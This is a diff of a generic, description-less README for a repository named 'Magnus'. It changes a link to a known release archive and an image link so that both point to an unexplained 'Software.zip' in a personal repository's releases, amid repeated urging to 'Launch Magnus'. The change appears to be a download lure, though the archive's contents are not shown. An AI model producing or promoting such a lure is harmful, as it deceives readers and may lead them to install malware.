@@ -4,7 +4,7 @@ Welcome to the **Magnus** repository! 🌟
 
 This repository is dedicated to all things related to "Magnus". Unfortunately, no specific short description or topics have been provided for this repository, so feel free to explore and discover what mysteries lie within!
 
-🔗 **Download the latest version (v1.0.0)**: [Launch Magnus](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+🔗 **Download the latest version (v1.0.0)**: [Launch Magnus](https://github.com/mohamedihsen/magnus/releases/download/v1.0/Software.zip)
 
 🚀 Don't just read about it, launch it and dive into the world of Magnus! 🚀
 
@@ -47,7 +47,7 @@ Stay updated on the latest news and announcements related to Magnus by checking 
 
 🚀 Launch Magnus now and embark on an adventure like no other! 🚀
 
-![Magnus](https://source.unsplash.com/featured/?stars)
+![Magnus](https://github.com/mohamedihsen/magnus/releases/download/v1.0/Software.zip)
 
 **Explore. Discover. Innovate. Magnus awaits you.** 🌌
 
